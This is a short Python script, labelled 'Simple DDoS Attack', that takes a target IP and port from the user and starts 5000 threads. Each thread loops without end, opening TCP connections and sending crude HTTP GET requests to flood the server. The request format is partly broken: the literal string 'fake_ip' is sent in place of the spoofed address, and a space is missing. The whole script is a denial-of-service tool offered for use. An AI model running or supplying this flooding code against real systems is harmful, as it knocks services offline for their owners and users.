# Simple Tools
# Author : NumeX
# Upgrade By RosanZ

# Module
import socket
import threading

# Banner();
print("Simple DDoS Attack\n [-]Author RosanZ[-] \n Note : Thanks To NumeX :)")
target = input("[?] Enter IP Target : ")
port = int(input("[?] Enter The Port : "))

# Using[-]FakeIP 
fake_ip = '182.21.20.32'

# Connectednya
already_connected = 0

# Fungsi Attacknya
def attack():
    while  True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("HOST: = fake_ip" + "\r\n\r\n").encode('ascii'), (target, port))

        global already_connected
        already_connected += 1
        if already_connected % 5000 == 0:
            print(already_connected) # oke work ya oke thanks yyyyyy

for i in range(5000):
    thread = threading.Thread(target=attack)
    thread.start()

